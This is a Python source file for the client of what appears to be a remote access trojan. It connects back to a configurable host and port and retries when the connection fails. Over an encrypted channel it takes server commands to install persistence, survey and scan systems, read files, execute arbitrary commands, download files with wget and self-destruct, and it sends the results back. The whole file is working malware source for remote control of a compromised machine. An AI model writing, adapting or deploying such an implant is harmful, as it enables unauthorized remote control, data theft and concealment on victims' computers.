#!/usr/bin/env python
import socket
import sys
import time
from core import crypto1
from core import persistence
from core import scan
from core import survey
from core import toolkit


# change these to suit your needs
#HOST = '192.168.1.114'
HOST = '127.0.0.1'
PORT = 8889

# seconds to wait before client will attempt to reconnect
CONN_TIMEOUT = 30

# determine system platform
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else:
    print 'This platform is not supported.'
    sys.exit(1)


def client_loop(conn, dhkey):
    while True:
        results = ''

        # wait to receive data from server
        data = crypto1.decrypt(conn.recv(4096), dhkey)

        # seperate data into command and action
        print(data)
        cmd, _, action = data.partition(' ')

        if cmd == 'kill':
            conn.close()
            return 1

        elif cmd == 'selfdestruct':
            conn.close()
            toolkit.selfdestruct(PLAT)

        elif cmd == 'quit':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break

        elif cmd == 'persistence':
            results = persistence.run(PLAT)

        elif cmd == 'scan':
            results = scan.single_host(action)

        elif cmd == 'survey':
            results = survey.run(PLAT)

        elif cmd == 'cat':
            results = toolkit.cat(action)

        elif cmd == 'execute':
            results = toolkit.execute(action)

        elif cmd == 'ls':
            results = toolkit.ls(action)

        elif cmd == 'pwd':
            results = toolkit.pwd()

        elif cmd == 'unzip':
            results = toolkit.unzip(action)

        elif cmd == 'wget':
            results = toolkit.wget(action)

        results = results.rstrip() + '\n{} completed.'.format(cmd)
        
        conn.send(crypto1.encrypt(results, dhkey))


def main():
    exit_status = 0
    connected = False
    conn = socket.socket()
    while True:
        if connected == False:
            try:
                conn.connect((HOST, PORT))
            except socket.error:
                time.sleep(CONN_TIMEOUT)
                connected = False
                continue

            dhkey = crypto1.diffiehellman(conn)
            try:
                exit_status = client_loop(conn, dhkey)
            except: pass

            if exit_status:
                sys.exit(0)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("exit with keyboardInterrupt")
        sys.exit(0)